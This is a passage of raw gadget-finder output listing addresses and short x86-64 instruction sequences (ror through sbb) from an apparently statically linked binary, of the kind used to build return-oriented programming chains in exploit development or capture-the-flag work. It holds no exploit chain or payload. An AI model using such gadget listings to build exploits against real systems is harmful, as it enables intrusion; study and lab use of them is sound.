0x000000000046612b : ror byte ptr [rax + 0xf], 0x44 ; ret 0xae9
0x00000000004616d9 : ror byte ptr [rax + 0xf], 1 ; ret 0x3949
0x00000000004616ca : ror byte ptr [rax + 0xf], 1 ; ret 0x8b41
0x0000000000431f4c : ror byte ptr [rax + 1], 0xf8 ; add rax, rcx ; ret
0x0000000000431e72 : ror byte ptr [rax + 1], 0xf8 ; ret
0x0000000000432363 : ror byte ptr [rax + 1], 0xf8 ; vzeroupper ; ret
0x000000000040c2f3 : ror byte ptr [rax + 1], 1 ; ret
0x00000000004475a4 : ror byte ptr [rax + 1], cl ; ror byte ptr [rax + 0x29], 1 ; clc ; ret
0x00000000004a5f88 : ror byte ptr [rax + rax], 0 ; ret
0x00000000004325f5 : ror byte ptr [rax - 0x2d], 0xfa ; movzx edx, dl ; sub eax, edx ; ret
0x0000000000489dec : ror byte ptr [rax - 0x3f], 0xe0 ; add ecx, dword ptr [rbp - 0x77] ; ret 0x8d48
0x000000000046d02a : ror byte ptr [rax - 0x3f], 0xe2 ; and byte ptr [rax + 9], cl ; ret 0xff83
0x00000000004015ff : ror byte ptr [rax - 0x68], 0xf3 ; ret
0x0000000000431e62 : ror byte ptr [rax - 0x73], 0x44 ; cmp al, dh ; ret
0x0000000000431e92 : ror byte ptr [rax - 0x73], 0x44 ; cmp byte ptr [rax], ah ; ret
0x0000000000431e82 : ror byte ptr [rax - 0x73], 0x44 ; cmp byte ptr [rax], dl ; ret
0x000000000042989e : ror byte ptr [rax - 0x73], 0x44 ; ret 0xfff
0x000000000048056a : ror byte ptr [rax - 0x73], cl ; add dword ptr [r15], r9d ; xchg eax, ebp ; ret 0xc283
0x0000000000417e30 : ror byte ptr [rax - 0x77], 1 ; ret
0x000000000049159d : ror byte ptr [rax - 0x77], 1 ; ret 0x3575
0x0000000000460ee4 : ror byte ptr [rax - 0x77], 1 ; ret 0x894c
0x000000000041a5b0 : ror byte ptr [rax - 0x77], 1 ; ret 0x8b48
0x0000000000488aea : ror byte ptr [rax - 0x77], 1 ; ret 0xc148
0x000000000041444d : ror byte ptr [rax - 0x77], 1 ; ret 0xe281
0x0000000000425eed : ror byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; ret
0x000000000049b27c : ror byte ptr [rax - 0x798f0007], cl ; stc ; jmp qword ptr [rax]
0x000000000041b291 : ror byte ptr [rax - 0x7b], 0xd2 ; jne 0x41b2a7 ; ret
0x000000000048b87c : ror byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x94 ; ret 0x950f
0x000000000041d015 : ror byte ptr [rax - 0x7d], 0xc4 ; or byte ptr [rbx + 0x5d], bl ; ret
0x000000000047c463 : ror byte ptr [rax - 0x7d], 0xc4 ; pop rax ; ret
0x000000000041c231 : ror byte ptr [rax - 0x7d], 0xc4 ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x000000000042483d : ror byte ptr [rax - 0x7d], 1 ; call 0xffffffffc2cb905c
0x000000000042597d : ror byte ptr [rax - 0x7d], 1 ; call 0xffffffffc2cba19c
0x0000000000426737 : ror byte ptr [rax - 0x7d], 1 ; call 0xffffffffc2cbaf56
0x000000000042823a : ror byte ptr [rax - 0x7d], 1 ; call 0xffffffffc2cbca59
0x000000000042873f : ror byte ptr [rax - 0x7d], 1 ; call 0xffffffffc2cbcf5e
0x0000000000428c7b : ror byte ptr [rax - 0x7d], 1 ; call 0xffffffffc2cbd49a
0x00000000004154d0 : ror byte ptr [rax - 0x7d], 1 ; ret 0x4801
0x000000000045bbe5 : ror byte ptr [rax - 0x7d], cl ; ret 0x4801
0x0000000000490175 : ror byte ptr [rax], 0x83 ; ret 0x3901
0x0000000000475c32 : ror byte ptr [rbp + 0x39441704], cl ; ret 0xf49
0x000000000047ab4c : ror byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x20 ; call rbx
0x000000000048b254 : ror byte ptr [rcx + 0x2b802], 1 ; add byte ptr [rax], al ; ret
0x0000000000492c67 : ror byte ptr [rcx + 0x63], 4 ; test byte ptr [rcx + rax - 0x20], cl ; jmp rax
0x00000000004017fe : ror byte ptr [rcx + rcx*4 - 0x3d], 1 ; or rax, r9 ; ret
0x0000000000478e66 : ror byte ptr [rcx + rcx*4 - 1], 0x41 ; call rsp
0x0000000000401e13 : ror byte ptr [rcx - 0x3dbaf028], 0x5b ; ret
0x0000000000462be6 : ror byte ptr [rcx - 0x73], 0x43 ; adc byte ptr [rdi], cl ; sahf ; ret 0x894c
0x000000000046ed18 : ror byte ptr [rcx - 0x77], cl ; ret
0x000000000045645f : ror byte ptr [rcx - 0x7d], cl ; cmp al, 0x24 ; add byte ptr [rdi], cl ; xchg eax, esp ; ret 0xd5e9
0x000000000047032e : ror byte ptr [rcx - 0x90f4b], 0xff ; jmp qword ptr [rdx + rax*8]
0x0000000000476a54 : ror byte ptr [rcx - 9], cl ; cmc ; mov rbp, rax ; jmp 0x476a27
0x000000000045271c : ror byte ptr [rdi], 0x44 ; ret 0x66c3
0x000000000047eb41 : ror byte ptr [rdi], 0x84 ; clc ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000046572c : ror byte ptr [rdi], 0x84 ; lahf ; or dword ptr [rax], eax ; add byte ptr [rcx - 0x77], cl ; ret
0x0000000000416a9d : ror byte ptr [rdi], 0x84 ; lodsb al, byte ptr [rsi] ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x000000000047c699 : ror byte ptr [rdi], 0x84 ; nop ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x0000000000416221 : ror byte ptr [rdi], 0x84 ; popfq ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00000000004090b6 : ror byte ptr [rdi], 0x84 ; ret
0x000000000046d82b : ror byte ptr [rdi], 0x84 ; ret 0x17
0x00000000004573e7 : ror byte ptr [rdi], 0x84 ; ret 0xfffc
0x0000000000447ada : ror byte ptr [rdi], 0x85 ; call qword ptr [rbx]
0x000000000042923f : ror byte ptr [rdi], 0x85 ; ret
0x00000000004534bf : ror byte ptr [rdi], 0x85 ; ret 0xfffe
0x0000000000484652 : ror byte ptr [rdi], 0x85 ; ret 2
0x000000000046e3c9 : ror byte ptr [rdi], 0x8f ; ret 7
0x0000000000486129 : ror byte ptr [rdi], 0x94 ; ret
0x0000000000487c1a : ror byte ptr [rdi], 0x94 ; ret 0x3d
0x00000000004745b5 : ror byte ptr [rdi], 0x94 ; ret 0x7f3c
0x000000000048b87f : ror byte ptr [rdi], 0x94 ; ret 0x950f
0x000000000044d64e : ror byte ptr [rdi], 0x94 ; ret 0xc085
0x0000000000416fcb : ror byte ptr [rdi], 0x94 ; ret 0xdaf7
0x0000000000416960 : ror byte ptr [rdi], 0x95 ; ret 0xdaf7
0x00000000004739ea : ror byte ptr [rdi], 0xb6 ; add al, 7 ; mov rax, qword ptr [rsi + rax*8] ; jmp rax
0x000000000042989b : ror byte ptr [rdi], 0xb6 ; ror byte ptr [rax - 0x73], 0x44 ; ret 0xfff
0x000000000044dac5 : ror byte ptr [rdi], 1 ; adc dword ptr [rdi + rdx - 0x40], edi ; ret
0x0000000000414462 : ror byte ptr [rdi], 1 ; mov dh, 0x17 ; test dl, dl ; jne 0x41444c ; ret
0x000000000046a35e : ror byte ptr [rdi], cl ; ret 0xf8c1
0x000000000048be7e : ror dword ptr [rax + 1], -8 ; sub rax, r8 ; ret
0x000000000044d658 : ror dword ptr [rax + 1], -8 ; sub rax, rsi ; ret
0x0000000000491764 : ror dword ptr [rax - 0x3f], cl ; out dx, eax ; xor byte ptr [rax - 0x77], cl ; ret 0x2148
0x00000000004761e6 : ror dword ptr [rax - 0x75], 4 ; ret 0x8548
0x0000000000429fe7 : ror dword ptr [rax - 0x77], 1 ; ret 0xaeeb
0x0000000000480973 : ror dword ptr [rax - 0x77], 1 ; ret 0xd348
0x000000000046ca60 : ror dword ptr [rax - 0x77], 1 ; ret 0xe7e9
0x000000000048c491 : ror dword ptr [rax - 0x77], cl ; ret
0x000000000041cf2d : ror dword ptr [rax - 0x7b], -0x2e ; jne 0x41cf27 ; ret
0x00000000004775fd : ror dword ptr [rax - 0x7b], -0x2e ; jne 0x4775f7 ; ret
0x000000000040143f : ror dword ptr [rax - 0x7d], 1 ; ret 0xc101
0x0000000000464834 : ror dword ptr [rax - 0x7d], cl ; ret 0x4820
0x000000000048aabd : ror dword ptr [rbp + rcx*4 + 0x14], cl ; ret
0x000000000049b2b0 : ror dword ptr [rbx - 0x73be0007], -7 ; call rcx
0x000000000046c41b : ror dword ptr [rcx - 0x77], 0x14 ; ret 0x8b48
0x00000000004016b5 : ror dword ptr [rcx - 1], 1 ; ret 0x1b8
0x000000000044b607 : ror dword ptr [rcx], cl ; ret 0xe074
0x000000000049b2cc : ror dword ptr [rdi - 0x6fc10007], -7 ; call rsi
0x00000000004338d8 : ror dword ptr [rdi], -0x7b ; adc byte ptr [rdx], cl ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000433fe4 : ror dword ptr [rdi], -0x7b ; add al, 3 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000433db6 : ror dword ptr [rdi], -0x7b ; add eax, 0xc0310000 ; ret
0x0000000000433d36 : ror dword ptr [rdi], -0x7b ; cmpsb byte ptr [rsi], byte ptr [rdi] ; add eax, 0xc0310000 ; ret
0x0000000000434074 : ror dword ptr [rdi], -0x7b ; je 0x434084 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000433b6b : ror dword ptr [rdi], -0x7b ; jno 0x433b80 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x0000000000433c33 : ror dword ptr [rdi], -0x7b ; mov ch, 6 ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00000000004338b0 : ror dword ptr [rdi], -0x7b ; sub al, 0xa ; add byte ptr [rax], al ; xor eax, eax ; ret
0x000000000041cf2c : ror qword ptr [r8 - 0x7b], -0x2e ; jne 0x41cf28 ; ret
0x00000000004775fc : ror qword ptr [r8 - 0x7b], -0x2e ; jne 0x4775f8 ; ret
0x000000000049c22d : sahf ; cli ; call rax
0x000000000044619e : sahf ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004ae345 : sahf ; ret 0x38ae
0x000000000048a3b1 : sahf ; ret 0x3948
0x0000000000462bec : sahf ; ret 0x894c
0x0000000000493354 : sahf ; ret 0xf45
0x000000000049c30c : sal al, 1 ; cli ; jmp rax
0x000000000041f2ae : sal bh, 0xd8 ; ret
0x000000000042c697 : sal bh, 1 ; ret 0x8000
0x000000000042c557 : sal bh, 1 ; ret 0xc000
0x000000000042c417 : sal bh, 1 ; ret 0xe000
0x000000000042c2d7 : sal bh, 1 ; ret 0xf000
0x000000000042c197 : sal bh, 1 ; ret 0xf800
0x000000000042c057 : sal bh, 1 ; ret 0xfc00
0x000000000042bf17 : sal bh, 1 ; ret 0xfe00
0x000000000042bdd7 : sal bh, 1 ; ret 0xff00
0x000000000042bc97 : sal bh, 1 ; ret 0xff80
0x000000000042bb57 : sal bh, 1 ; ret 0xffc0
0x000000000042ba17 : sal bh, 1 ; ret 0xffe0
0x000000000042b8d7 : sal bh, 1 ; ret 0xfff0
0x000000000042b797 : sal bh, 1 ; ret 0xfff8
0x000000000042b657 : sal bh, 1 ; ret 0xfffc
0x000000000042b517 : sal bh, 1 ; ret 0xfffe
0x0000000000401618 : sal bl, 1 ; ret
0x0000000000401a45 : sal bl, cl ; ret
0x000000000041438d : sal byte ptr [rax + 0x48], 0xc7 ; ret 0xfff0
0x00000000004902e1 : sal byte ptr [rax + rax*8 + 0x49], 0x83 ; ret 0xf608
0x000000000047a702 : sal byte ptr [rbp + 0x2b], 0x4c ; mov eax, eax ; vzeroupper ; ret
0x00000000004891ae : sal byte ptr [rbp + 0x4f], 0x89 ; ret
0x000000000040c73b : sal byte ptr [rbp + 0xa], 0x5b ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x0000000000496103 : sal byte ptr [rbp + 0xa], 0xf3 ; ret
0x00000000004005c4 : sal byte ptr [rbp + 2], cl ; ret
0x00000000004960e8 : sal byte ptr [rbp + 5], 0xf3 ; ret
0x000000000041b294 : sal byte ptr [rbp + 9], cl ; ret
0x0000000000452851 : sal byte ptr [rbp - 0x10], 0x5a ; pop r10 ; ret
0x000000000041de4d : sal byte ptr [rbp - 0x10], 0xf3 ; ret
0x000000000044d340 : sal byte ptr [rbp - 0x13], cl ; lea rax, qword ptr [rcx - 1] ; ret
0x000000000041cf30 : sal byte ptr [rbp - 0x13], cl ; ret
0x000000000040349a : sal byte ptr [rbp - 0x164a245b], 0x5b ; ret 0x3956
0x000000000042c9bb : sal byte ptr [rbp - 0x1e], 0x31 ; shr byte ptr [rcx], 0xc8 ; ret
0x0000000000414467 : sal byte ptr [rbp - 0x27], cl ; ret
0x000000000043239d : sal byte ptr [rbp - 0x30], 0xc5 ; std ; xlatb ; ret
0x0000000000487a88 : sal byte ptr [rbp - 0x31], cl ; movsx eax, cl ; neg eax ; ret
0x0000000000432395 : sal byte ptr [rbp - 0x38], 0xc5 ; std ; xlatb ; ret 0xc085
0x00000000004471ed : sal byte ptr [rbp - 0x50], 0xc5 ; std ; xlatb ; ret
0x00000000004471e5 : sal byte ptr [rbp - 0x68], 0xc5 ; std ; xlatb ; ret 0xc085
0x000000000047afbb : sal byte ptr [rbp - 0xe], cl ; ret
0x000000000041f26c : sal byte ptr [rbx + 0x21], 1 ; movzx eax, byte ptr [rax] ; ret
0x0000000000453a76 : sal byte ptr [rbx + rbp + 0x48], 0x8b ; push rax ; or dh, dh ; ret 0x8902
0x000000000048dd3c : sal byte ptr [rbx + rdi + 0x48], cl ; shl edx, 5 ; add rdx, rax ; jmp 0x48dd5a
0x00000000004474ec : sal byte ptr [rcx + rdx + 0x48], cl ; bsf eax, edx ; ret
0x0000000000455432 : sal byte ptr [rcx], 0xd2 ; add eax, 1 ; push rax ; call rbx
0x0000000000452826 : sal byte ptr [rcx], 1 ; ror byte ptr [rax + 0x39], 0xfa ; setae al ; ret
0x000000000047a40b : sal byte ptr [rdx + 0x48], cl ; bsf eax, edx ; ret
0x000000000045329b : sal byte ptr [rdx + rcx + 0x48], cl ; lea edi, dword ptr [rcx + rax + 0x20] ; jmp rdx
0x0000000000447803 : sal byte ptr [rdx + rdx + 0x48], 0xff ; ret 0x2288
0x000000000049b444 : sal byte ptr [rdx - 0x4b2f0007], 1 ; stc ; call rax
0x00000000004153cc : sal byte ptr [rdx], 1 ; insb byte ptr [rdi], dx ; add byte ptr [rax + 0x39], cl ; ret
0x000000000049b44c : sal byte ptr [rsi - 0x569f0007], 1 ; stc ; jmp qword ptr [rax]
0x000000000048bc41 : sal byte ptr [rsp + rcx + 0x5b], 0x5d ; pop r12 ; ret
0x0000000000486589 : sal byte ptr [rsp + rsi + 0x48], 0x89 ; ret
0x000000000049033a : sal byte ptr [rsp + rsi*4 + 0x48], 0x83 ; ret 0xf608
0x00000000004b5c40 : sal cl, 0xf6 ; jmp rsi
0x000000000049c330 : sal cl, 1 ; cli ; push rax ; int1 ; cli ; call qword ptr [rax]
0x000000000044da23 : sal ebx, 1 ; movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x0000000000400dc4 : sal ebx, 1 ; movsq qword ptr [rdi], qword ptr [rsi] ; nop ; leave ; ret
0x0000000000487a8d : sal edi, -0x28 ; ret
0x000000000044b646 : salc ; add dword ptr [rax], eax ; add dh, dh ; ret 0x7510
0x000000000042a2d2 : salc ; add dword ptr [rax], eax ; cmovne rax, rdx ; ret
0x000000000049b750 : salc ; add eax, 0xc46fffa ; cli ; call rsi
0x0000000000434366 : salc ; add rdi, rdx ; add r9, r11 ; jmp r9
0x0000000000496bd1 : salc ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000044d78a : salc ; clc ; ret
0x00000000004852d4 : salc ; cmp rcx, rsi ; jne 0x4852b7 ; ret
0x000000000040c71e : salc ; mov byte ptr [rcx], 0 ; pop rbx ; pop rbp ; pop r12 ; ret
0x00000000004852d9 : salc ; ret
0x000000000049b61d : salc ; stc ; call rax
0x000000000049b67d : salc ; stc ; inc dword ptr [rax] ; fdivr st(1) ; call rax
0x000000000049b559 : salc ; stc ; jmp rax
0x0000000000409980 : sar bh, 0xff ; dec dword ptr [rax - 0x39] ; ret
0x000000000044ffb3 : sar bh, 0xff ; dec dword ptr [rax - 0x39] ; ret 0xffff
0x0000000000486913 : sar bh, 0xff ; lcall ptr [rbx + 0x64] ; mov eax, dword ptr [rax] ; ret
0x000000000048b1b0 : sar bh, 0xff ; mov eax, 1 ; ret
0x00000000004090b2 : sar byte ptr [rax + 0x5b], 0x85 ; ror byte ptr [rdi], 0x84 ; ret
0x0000000000482851 : sar byte ptr [rax + 0xe], 0x5b ; ret
0x00000000004bcf80 : sar byte ptr [rax - 3], 1 ; call qword ptr [rbx]
0x00000000004ba3bc : sar byte ptr [rcx], 0 ; jo 0x4ba3b9 ; sti ; jmp qword ptr [rbx]
0x000000000044d5fe : sar byte ptr [rcx], 0xc8 ; jle 0x44d640 ; movsxd rax, ecx ; ret
0x0000000000453ffd : sar byte ptr [rcx], cl ; ret
0x000000000045f4f6 : sar byte ptr [rdx], 0xf ; ret 0xc083
0x00000000004aecdf : sar byte ptr [rsi + rax*2], 0xf8 ; mov ch, 0x36 ; push rcx ; call qword ptr [rsi]
0x000000000049b6e1 : sar cl, 0xff ; jo 0x49b6af ; stc ; inc eax ; ret 0xfff9
0x000000000049b571 : sar cl, cl ; call qword ptr [rax]
0x000000000049b5b1 : sar cl, cl ; call rax
0x000000000049b551 : sar cl, cl ; jmp qword ptr [rax]
0x000000000049b591 : sar cl, cl ; push rax ; sar ecx, cl ; call rax
0x000000000043ef63 : sar dword ptr [rax + rcx*2 + 0x11], 1 ; jns 0x43ef6e ; ret
0x00000000004019cb : sar dword ptr [rdx], 0xf ; xchg eax, ebp ; ret 0x2948
0x000000000044df39 : sar dword ptr [rsi + 0x7f], 0x23 ; vzeroupper ; ret
0x000000000047885c : sar eax, 2 ; lea eax, dword ptr [r8 - 1] ; ret
0x000000000048f24e : sar eax, 3 ; pop rbp ; pop r12 ; pop r13 ; ret
0x00000000004bbb0d : sar ebp, -1 ; ret
0x000000000049b6a5 : sar ecx, -1 ; push rax ; ret 0xfff9
0x000000000049b6e5 : sar ecx, -1 ; rol dl, 0xf9 ; call qword ptr [rax]
0x00000000004aea43 : sar ecx, 1 ; jnp 0x4aea04 ; ret
0x000000000049b611 : sar ecx, 1 ; push qword ptr [rax] ; sar ecx, cl ; call qword ptr [rax]
0x000000000049b631 : sar ecx, 1 ; push rax ; sar cl, cl ; call rax
0x000000000049b615 : sar ecx, cl ; call qword ptr [rax]
0x000000000049b595 : sar ecx, cl ; call rax
0x000000000041c1c7 : sar edx, 2 ; call 0x418425
0x0000000000478962 : sar edx, 2 ; sub eax, edx ; ret
0x00000000004325f7 : sar edx, cl ; movzx edx, dl ; sub eax, edx ; ret
0x000000000044e3f3 : sar esi, 1 ; jg 0x44e423 ; vzeroupper ; ret
0x000000000044e58c : sar esi, 1 ; jg 0x44e5bc ; vzeroupper ; ret
0x000000000047885b : sar r8, 2 ; lea eax, dword ptr [r8 - 1] ; ret
0x000000000048f24d : sar rax, 3 ; pop rbp ; pop r12 ; pop r13 ; ret
0x000000000041c1c6 : sar rdx, 2 ; call 0x418426
0x000000000041c1c5 : sar rdx, 2 ; call 0x418427
0x0000000000478961 : sar rdx, 2 ; sub eax, edx ; ret
0x00000000004325f6 : sar rdx, cl ; movzx edx, dl ; sub eax, edx ; ret
0x000000000046a015 : sbb ah, byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; ret
0x0000000000492563 : sbb al, 0x23 ; add byte ptr [rax], cl ; ret
0x000000000046d48d : sbb al, 0x29 ; ret 0xe683
0x000000000041fb56 : sbb al, 0x2a ; add bl, dh ; ret
0x000000000041fc3b : sbb al, 0x2a ; add byte ptr [rcx + rax + 0x57], al ; sbb byte ptr [rax + 0x39], cl ; ret
0x000000000046e3c7 : sbb al, 0x85 ; ror byte ptr [rdi], 0x8f ; ret 7
0x00000000004034ae : sbb al, 0xab ; pop rbx ; ret 0x3956
0x00000000004ab044 : sbb al, 0xaf ; cld ; jmp qword ptr [rax]
0x000000000046900f : sbb al, 1 ; add byte ptr [rax - 0x7d], cl ; clc ; dec dword ptr [rcx - 0x77] ; ret
0x00000000004149b2 : sbb al, 7 ; mov rax, qword ptr [rsp + 8] ; call rax
0x000000000046aaf6 : sbb al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x000000000040d863 : sbb al, byte ptr [rax] ; add byte ptr [rbx - 0x7bf0fc06], al ; ret
0x000000000047059b : sbb al, byte ptr fs:[rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x00000000004119f8 : sbb al, ch ; ret 0xffaf
0x000000000049b5ac : sbb bh, 0xf9 ; call qword ptr [rax]
0x000000000049b155 : sbb bh, cl ; push rax ; sbb edi, ecx ; call qword ptr [rax]
0x00000000004ad7c5 : sbb bl, byte ptr [rsi] ; ret
0x00000000004887d4 : sbb byte ptr [r8 + 0x5a], bl ; pop rbx ; ret
0x000000000048c754 : sbb byte ptr [r8], al ; add byte ptr [rax], al ; add bl, ch ; ret
0x000000000048b879 : sbb byte ptr [r9], sil ; ror byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x94 ; ret 0x950f
0x0000000000484e31 : sbb byte ptr [rax + 0x29], cl ; ret 0x394c
0x000000000041fc41 : sbb byte ptr [rax + 0x39], cl ; ret
0x0000000000464984 : sbb byte ptr [rax + 0x39], cl ; ret 0x850f
0x00000000004887d5 : sbb byte ptr [rax + 0x5a], bl ; pop rbx ; ret
0x0000000000400fe7 : sbb byte ptr [rax + 1], bh ; ret
0x0000000000400fe6 : sbb byte ptr [rax + 1], dil ; ret
0x0000000000401b73 : sbb byte ptr [rax + rax], ch ; test eax, eax ; je 0x401b88 ; ret
0x000000000046fea2 : sbb byte ptr [rax - 0x3f], cl ; cli ; add cl, byte ptr [rax + 0x39] ; ret 0x850f
0x00000000004877fc : sbb byte ptr [rax - 0x75], cl ; cmp al, ch ; ret
0x000000000049495a : sbb byte ptr [rax - 0x75], cl ; or byte ptr [rax - 0x77], cl ; ret
0x00000000004891b7 : sbb byte ptr [rax - 0x75], cl ; push rsp ; and al, 0x10 ; call rdx
0x0000000000425e9d : sbb byte ptr [rax - 0x77], cl ; fistp word ptr [rbx + 0x5d] ; jmp rax
0x000000000047ae90 : sbb byte ptr [rax - 0x77], cl ; out dx, eax ; mov r9, r14 ; call rbx
0x00000000004865ac : sbb byte ptr [rax - 0x77], cl ; push rbx ; adc byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x000000000041cf91 : sbb byte ptr [rax - 0x77], cl ; push rdi ; mov qword ptr [rdi + 8], rax ; ret
0x0000000000420beb : sbb byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; ret
0x000000000048c45f : sbb byte ptr [rax - 0x77], cl ; ret
0x0000000000420403 : sbb byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x84 ; ret
0x000000000048c755 : sbb byte ptr [rax], al ; add byte ptr [rax], al ; add bl, ch ; ret
0x0000000000410eaa : sbb byte ptr [rax], al ; add byte ptr [rbx - 0x7bf0fc06], al ; ret
0x00000000004913d5 : sbb byte ptr [rbx + 0x5d], 0x41 ; pop rsp ; ret
0x00000000004264b8 : sbb byte ptr [rbx + 0x5d], bl ; jmp rax
0x0000000000453ddc : sbb byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x0000000000418367 : sbb byte ptr [rbx + 0x5d], bl ; ret
0x000000000041ee27 : sbb byte ptr [rbx - 0x2fd6efb9], cl ; ret
0x000000000047867a : sbb byte ptr [rcx + 0x5bc0310b], cl ; ret
0x000000000042031e : sbb byte ptr [rcx + 1], cl ; ret 0x8d48
0x0000000000478b8e : sbb byte ptr [rcx + rcx*4 - 0x19], cl ; call rbx
0x0000000000496c4f : sbb byte ptr [rcx + rdi + 0x6d], cl ; js 0x496cd2 ; ret 0x8b48
0x000000000045afa8 : sbb byte ptr [rcx - 0x77], al ; ret
0x0000000000414560 : sbb byte ptr [rcx], al ; add byte ptr [rax], al ; ret
0x0000000000425eeb : sbb byte ptr [rcx], dh ; ror byte ptr [rax - 0x77], cl ; rcr byte ptr [rbx + 0x5d], 1 ; ret
0x000000000048b87a : sbb byte ptr [rcx], dh ; ror byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x94 ; ret 0x950f
0x000000000049b4f8 : sbb byte ptr [rdi - 0x5f2f0007], 0xf9 ; jmp qword ptr [rax]
0x00000000004b7114 : sbb byte ptr [rdi], al ; add al, cl ; jbe 0x4b711b ; call qword ptr [rdx]
0x00000000004b8728 : sbb byte ptr [rdx + rdi*8], dl ; call qword ptr [rdi]
0x000000000048dc3b : sbb byte ptr [rdx], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x000000000049c22c : sbb byte ptr [rsi - 0x602f0006], 0xfa ; jmp qword ptr [rax]
0x00000000004246ed : sbb cl, byte ptr [rax + 0x29480614] ; ror byte ptr [rax + 0x39], 1 ; ret
0x000000000045e72d : sbb cl, byte ptr [rdi] ; mov bh, 0x47 ; or cl, byte ptr [rax + 0x39] ; ret 0x1176
0x00000000004448ed : sbb cl, byte ptr [rdi] ; xchg ah, bl ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000044653a : sbb cl, byte ptr [rdi] ; xchg bh, bh ; add eax, 0x83480000 ; ret 0x4910
0x0000000000445d5a : sbb cl, byte ptr [rdi] ; xchg bh, bl ; or eax, 0x83480000 ; ret 0x4910
0x000000000044614a : sbb cl, byte ptr [rdi] ; xchg bh, ch ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000044596a : sbb cl, byte ptr [rdi] ; xchg bh, cl ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000044544d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rax], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000444c2d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rcx - 0x7cb80000], bl ; ret 0xe910
0x000000000044440d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rdx - 0x7cb80000], bh ; ret 0xe910
0x0000000000445b09 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rax], dh ; adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000444f6d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbp + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000044474d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbp + rcx], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000443f2d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbp + rdx - 0x7cb80000], bl ; ret 0xe910
0x000000000044510d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rbx + rax - 0x7cb80000], bh ; ret 0xe910
0x0000000000445ffa : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi], bh ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000044581a : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi], bl ; adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000044692a : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi], cl ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x000000000044426d : sbb cl, byte ptr [rdi] ; xchg byte ptr [rdx + rdx], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004443a3 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], ah ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004450a3 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], ah ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000444bc3 : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], al ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000445efb : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], bh ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000044682b : sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], cl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004453e3 : sbb cl, byte ptr [rdi] ; xchg dh, ah ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00000000004446e3 : sbb cl, byte ptr [rdi] ; xchg dh, ah ; or eax, 0x83480000 ; ret 0x4910
0x0000000000444203 : sbb cl, byte ptr [rdi] ; xchg dh, al ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000444f03 : sbb cl, byte ptr [rdi] ; xchg dh, al ; add eax, 0x83480000 ; ret 0x4910
0x000000000044604b : sbb cl, byte ptr [rdi] ; xchg dh, ch ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x000000000044586b : sbb cl, byte ptr [rdi] ; xchg dh, cl ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
